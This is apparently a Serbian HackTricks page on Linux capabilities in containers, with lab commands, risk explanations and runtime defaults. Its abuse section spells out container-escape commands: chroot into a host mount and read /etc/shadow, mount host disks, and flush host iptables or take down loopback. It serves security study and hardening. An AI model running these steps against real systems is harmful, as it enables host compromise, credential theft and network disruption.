# Linux sposobnosti (capabilities) u kontejnerima

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

Linux capabilities su jedan od najvažnijih delova sigurnosti kontejnera zato što odgovaraju na suptilno ali fundamentalno pitanje: **šta „root“ zaista znači unutar kontejnera?** Na običnom Linux sistemu, UID 0 je istorijski podrazumevao veoma širok skup privilegija. U modernim kernelima ta privilegija je dekomponovana u manje jedinice nazvane capabilities. Proces može da radi kao root, a ipak da nema mnoge moćne operacije ako su relevantne capabilities uklonjene.

Kontejneri uveliko zavise od ove distinkcije. Mnogi workload-ovi se i dalje pokreću kao UID 0 unutar kontejnera iz razloga kompatibilnosti ili jednostavnosti. Bez uklanjanja capabilities to bi bilo previše opasno. Sa uklanjanjem capabilities, proces root u kontejneru i dalje može da izvršava mnoge uobičajene zadatke unutar kontejnera dok mu se uskraćuju osetljivije kernel operacije. Zato shell u kontejneru koji kaže `uid=0(root)` ne znači automatski „root na hostu“ ili čak „široke kernel privilegije“. Skupovi capabilities odlučuju koliko ta root identifikacija zaista vredi.

Za kompletnu referencu Linux capabilities i mnogo primera zloupotrebe, vidi:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Kako funkcionišu

Capabilities se prate u nekoliko skupova, uključujući permitted, effective, inheritable, ambient i bounding setove. Za mnoge procene kontejnera, tačna kernel semantika svakog skupa nije odmah toliko važna kao konačno praktično pitanje: **koje privilegovane operacije ovaj proces trenutno može uspešno da izvrši, i koja buduća dobijanja privilegija su još moguća?**

Razlog zašto je ovo važno je što su mnoge tehnike bekreka zapravo problemi capabilities zamaskirani kao problemi kontejnera. Workload sa `CAP_SYS_ADMIN` može da pristupi ogromnom broju kernel funkcionalnosti koje normalan root proces u kontejneru ne bi trebalo da dodiruje. Workload sa `CAP_NET_ADMIN` postaje mnogo opasniji ako takođe deli host network namespace. Workload sa `CAP_SYS_PTRACE` postaje mnogo interesantniji ako može da vidi host procese kroz deljenje host PID namespace-a. U Docker-u ili Podman-u to se može pojaviti kao `--pid=host`; u Kubernetes-u se obično pojavljuje kao `hostPID: true`.

Drugim rečima, skup capabilities ne može da se proceni izolovano. Mora se čitati zajedno sa namespaces, seccomp, i MAC policy.

## Laboratorija

Veoma direktan način da se ispituju capabilities unutar kontejnera je:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Takođe možete uporediti restriktivniji container sa onim kojem su dodate sve capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Da biste videli efekat suženog dodavanja, pokušajte da uklonite sve i dodate nazad samo jednu capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ovi mali eksperimenti pomažu da se pokaže da runtime nije jednostavno prebacivanje booleana nazvanog "privileged". On oblikuje stvarnu površinu privilegija dostupnu procesu.

## Visoko rizične mogućnosti

Iako mnoge capabilities mogu biti važne u zavisnosti od cilja, nekoliko njih se ponavlja kao relevantno u analizi bekstva iz kontejnera.

**`CAP_SYS_ADMIN`** je onaj koji bi branitelji trebalo da tretiraju sa najvećim oprezom. Često se opisuje kao "novi root" zato što otključava ogroman broj funkcionalnosti, uključujući operacije vezane za mount, ponašanje zavisno od namespace-a i mnoge kernel putanje koje nikada ne bi trebalo olako izlagati kontejnerima. Ako kontejner ima `CAP_SYS_ADMIN`, slab seccomp i nema snažna MAC ograničenja, mnogi klasični putevi za proboj postaju mnogo realističniji.

**`CAP_SYS_PTRACE`** je važan kada postoji vidljivost procesa, naročito ako je PID namespace deljen sa hostom ili sa relevantnim susednim workload-ovima. Može pretvoriti vidljivost u mogućnost manipulacije.

**`CAP_NET_ADMIN`** i **`CAP_NET_RAW`** su važni u okruženjima fokusiranim na mrežu. Na izolovanoj bridge mreži oni mogu već predstavljati rizik; na deljenom host network namespace-u su mnogo gori jer workload može moći da rekonfiguriše host networking, presreće, falsifikuje ili ometa lokalne tokove saobraćaja.

**`CAP_SYS_MODULE`** je obično katastrofalan u okruženju sa pristupom root-u jer učitavanje kernel modula efektivno znači kontrolu nad host kernelom. Skoro nikada ne bi trebalo da se pojavi u opštem kontejnerskom workload-u.

## Korišćenje u runtime-u

Docker, Podman, stackovi zasnovani na containerd i CRI-O svi koriste kontrolu capabilities, ali podrazumevane vrednosti i interfejsi za upravljanje se razlikuju. Docker ih eksponira vrlo direktno kroz flagove kao što su `--cap-drop` i `--cap-add`. Podman izlaže slične kontrole i često ima koristi od rootless izvršavanja kao dodatnog sloja bezbednosti. Kubernetes omogućava dodavanje i uklanjanje capabilities kroz Pod ili container `securityContext`. System-container okruženja kao što su LXC/Incus takođe se oslanjaju na kontrolu capabilities, ali šira integracija tih sistema sa hostom često mami operatore da agresivnije opuštaju podrazumevana podešavanja nego što bi to radili u app-container okruženju.

Isti princip važi za sve njih: capability koji je tehnički moguće dodeliti nije nužno nešto što bi trebalo dodeliti. Mnogi incidenti iz stvarnog sveta počinju kada operator doda capability jednostavno zato što workload nije radio pod strožom konfiguracijom i tim je trebao brzo rešenje.

## Pogrešne konfiguracije

Najočiglednija greška je **`--cap-add=ALL`** u Docker/Podman-style CLI-jima, ali to nije jedina. U praksi, češći problem je davanje jedne ili dve izuzetno moćne capabilities, naročito `CAP_SYS_ADMIN`, kako bi "aplikacija radila" bez razumevanja implikacija na namespace, seccomp i mount. Drugi čest način greške je kombinovanje dodatnih capabilities sa deljenjem host namespace-a. U Docker-u ili Podman-u to se može pojaviti kao `--pid=host`, `--network=host`, ili `--userns=host`; u Kubernetes-u ekvivalentna izloženost obično se pojavljuje kroz podešavanja workload-a kao što su `hostPID: true` ili `hostNetwork: true`. Svaka od tih kombinacija menja šta capability zapravo može uticati.

Takođe je uobičajeno da administratori veruju da zato što workload nije potpuno `--privileged`, on je i dalje značajno ograničen. Ponekad je to tačno, ali ponekad je efektivni položaj već dovoljno blizu privilegovanom da razlika prestane da bude bitna operacionalno.

## Zloupotreba

Prvi praktičan korak je da se izenumeri efektivni skup capabilities i odmah testiraju capability-specifične akcije koje bi bile važne za bekstvo iz kontejnera ili pristup informacijama hosta:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Ako je prisutan `CAP_SYS_ADMIN`, prvo testirajte mount-based abuse i host filesystem access, jer je ovo jedan od najčešćih breakout enablers:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Ako je `CAP_SYS_PTRACE` prisutan i kontejner može da vidi interesantne procese, proverite da li se ta dozvola može iskoristiti za inspekciju procesa:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Ako su prisutni `CAP_NET_ADMIN` ili `CAP_NET_RAW`, proverite da li workload može da manipuliše vidljivim mrežnim stogom ili makar da prikupi korisne informacije o mreži:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Kada test capability-a uspe, kombinujte ga sa situacijom namespace-a. Capability koji izgleda samo rizično u izolovanom namespace-u može odmah postati escape ili host-recon primitiv kada kontejner takođe deli host PID, host network, ili host mounts.

### Potpun primer: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Ako kontejner ima `CAP_SYS_ADMIN` i upisiv bind mount host filesystem-a kao što je `/host`, put za escape je često jednostavan:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Ako `chroot` uspe, komande se sada izvršavaju u kontekstu root datotečnog sistema hosta:
```bash
id
hostname
cat /etc/shadow | head
```
Ako `chroot` nije dostupan, isti rezultat se često može postići pozivanjem binary datoteke kroz montirano stablo:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Potpun primer: `CAP_SYS_ADMIN` + Device Access

Ako je blok uređaj sa hosta izložen, `CAP_SYS_ADMIN` može да ga претвори у директан приступ датотечном систему hosta:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Kompletan primer: `CAP_NET_ADMIN` + mreža hosta

Ova kombinacija ne mora uvek direktno omogućiti root na hostu, ali može u potpunosti rekonfigurisati mrežni stack hosta:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
To može omogućiti denial of service, presretanje saobraćaja ili pristup servisima koji su ranije bili filtrirani.

## Checks

Cilj capability checks nije samo da ispiše raw values, već da se utvrdi da li proces ima dovoljno privilegija da njegova trenutna namespace i mount situacija budu opasne.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Šta je ovde interesantno:

- `capsh --print` je najjednostavniji način da se uoče visokorizične capabilities kao što su `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, ili `cap_sys_module`.
- Linija `CapEff` u `/proc/self/status` pokazuje šta je zapravo efektivno sada, a ne samo šta bi moglo biti dostupno u drugim skupovima.
- Dump capabilities postaje mnogo važniji ako container takođe deli host PID, network, ili user namespaces, ili ima host mount-ove koji su upisivi.

Nakon prikupljanja sirovih informacija o capabilities, sledeći korak je interpretacija. Postavite pitanje da li je proces root, da li su user namespaces aktivne, da li se host namespaces dele, da li seccomp primenjuje pravila, i da li AppArmor ili SELinux i dalje ograničavaju proces. Skup capabilities sam po sebi je samo deo priče, ali često je upravo on deo koji objašnjava zašto jedan container breakout uspeva, a drugi ne sa istom naizgled početnom tačkom.

## Runtime Defaults

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno oslabljenje |
| --- | --- | --- | --- |
| Docker Engine | Smanjen skup capabilities po defaultu | Docker zadržava podrazumevanu listu dozvoljenih capabilities i odbacuje ostale | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Smanjen skup capabilities po defaultu | Podman containeri su po defaultu neprivilegovani i koriste model sa smanjenim capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Nasleđuje runtime podrazumevane vrednosti osim ako nisu promenjene | Ako nisu navedeni `securityContext.capabilities`, container dobija podrazumevani skup capabilities iz runtime-a | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Obično runtime podrazumevano | Efektivni skup zavisi od runtime-a plus Pod spec | isto kao u Kubernetes redu; direktna OCI/CRI konfiguracija takođe može eksplicitno dodati capabilities |

Za Kubernetes, važna poenta je da API ne definiše jedan univerzalni podrazumevani skup capabilities. Ako Pod ne dodaje niti ne uklanja capabilities, workload nasleđuje runtime podrazumevano za taj node.
{{#include ../../../../banners/hacktricks-training.md}}
